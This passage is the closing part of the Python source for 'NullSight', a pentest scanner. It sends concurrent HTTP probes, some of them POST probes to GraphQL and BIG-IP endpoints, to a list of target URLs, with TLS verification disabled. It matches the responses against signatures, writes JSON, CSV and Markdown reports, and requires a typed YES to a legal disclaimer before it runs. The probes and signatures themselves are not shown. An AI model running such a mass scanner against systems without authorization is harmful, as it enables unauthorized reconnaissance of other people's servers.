        f"Timeout      : [yellow]{CONFIG.timeout}s[/yellow]  "
        f"[dim](connect {CONFIG.connect_timeout}s / read {CONFIG.read_timeout}s)[/dim]\n"
        f"Body limit   : [yellow]{CONFIG.max_body_bytes // 1024}KB[/yellow]\n"
        f"POST probes  : [yellow]{sum(1 for p in PROBES if p.method=='POST')}[/yellow]  "
        f"[dim](GraphQL, BIG-IP, ...)[/dim]",
        title="[bold green]⚠  AUTHORIZED PENTEST ONLY — NullSight  ⚠[/bold green]",
        border_style="green",
    ))

    out_dir = Path(CONFIG.output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)

    stats    = Stats(total=total)
    findings: list[Finding] = []

    queue: asyncio.Queue = asyncio.Queue(maxsize=CONFIG.queue_maxsize)

    connector = aiohttp.TCPConnector(
        ssl=False,
        limit=CONFIG.concurrency + 150,
        limit_per_host=20,
        ttl_dns_cache=300,
        use_dns_cache=True,
        force_close=True,
        enable_cleanup_closed=True,
    )

    console.print(f"\n[bold]Starting — {total:,} probes | "
                  f"{CONFIG.concurrency} workers | "
                  f"{len(SIGNATURES)} signatures[/bold]\n")

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[cyan]{task.completed}/{task.total}"),
        TextColumn("[yellow]{task.fields[rps]:.0f} req/s"),
        TextColumn("[red]findings: {task.fields[findings]}"),
        TimeElapsedColumn(),
        console=console,
        refresh_per_second=10,
    ) as progress:
        task_id = progress.add_task("Scanning…", total=total, rps=0.0, findings=0)

        async with aiohttp.ClientSession(connector=connector) as session:
            workers = [
                asyncio.create_task(
                    worker(queue, session, stats, findings,
                           progress, task_id, console, out_dir)
                )
                for _ in range(CONFIG.concurrency)
            ]
            await producer(queue, urls)
            await asyncio.gather(*workers)

    ts  = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    jp  = out_dir / f"report_{ts}.json"
    cp  = out_dir / f"report_{ts}.csv"
    mp  = out_dir / f"report_{ts}.md"
    save_json(findings, jp)
    save_csv(findings, cp)
    save_markdown(findings, stats, mp)

    print_summary(stats, findings, console)
    console.print(f"\n[bold green]Reports saved:[/bold green]")
    console.print(f"  JSON     → [cyan]{jp}[/cyan]")
    console.print(f"  CSV      → [cyan]{cp}[/cyan]")
    console.print(f"  Markdown → [cyan]{mp}[/cyan]")
    console.print(f"  Files    → [cyan]{out_dir}/[/cyan]\n")

# ─────────────────────────────────────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────────────────────────────────────
def main() -> None:
    import argparse
    console = Console()

    # Legal disclaimer
    console.print(Panel(DISCLAIMER, border_style="yellow"))
    answer = input(">>> ").strip().upper()
    if answer != "YES":
        console.print("[red]Declined. Exiting.[/red]")
        sys.exit(0)

    p = argparse.ArgumentParser(
        description="NullSight Pentest Scanner ")
    p.add_argument("-c", "--concurrency",   type=int, default=120,
                   help="Worker count (default: 120)")
    p.add_argument("-t", "--timeout",       type=int, default=22,
                   help="Total timeout seconds (default: 22)")
    p.add_argument("--connect-timeout",     type=int, default=10)
    p.add_argument("--read-timeout",        type=int, default=16)
    p.add_argument("-q", "--queue-size",    type=int, default=5000)
    p.add_argument("-u", "--url-file",      default="url.txt")
    p.add_argument("-o", "--output-dir",    default="NullSight_findings")
    p.add_argument("-b", "--body-limit",    type=int, default=65536)
    p.add_argument("--delay",               type=float, default=0.0,
                   help="Max random delay between requests (seconds)")
    args = p.parse_args()

    CONFIG.concurrency     = args.concurrency
    CONFIG.timeout         = args.timeout
    CONFIG.connect_timeout = args.connect_timeout
    CONFIG.read_timeout    = args.read_timeout
    CONFIG.queue_maxsize   = args.queue_size
    CONFIG.url_file        = args.url_file
    CONFIG.output_dir      = args.output_dir
    CONFIG.max_body_bytes  = args.body_limit
    CONFIG.delay_max       = args.delay

    try:
        asyncio.run(run(console))
    except FileNotFoundError as e:
        console.print(f"[bold red]Error:[/bold red] {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        console.print("\n[yellow]Scan interrupted by user.[/yellow]")
        sys.exit(0)

if __name__ == "__main__":
    main()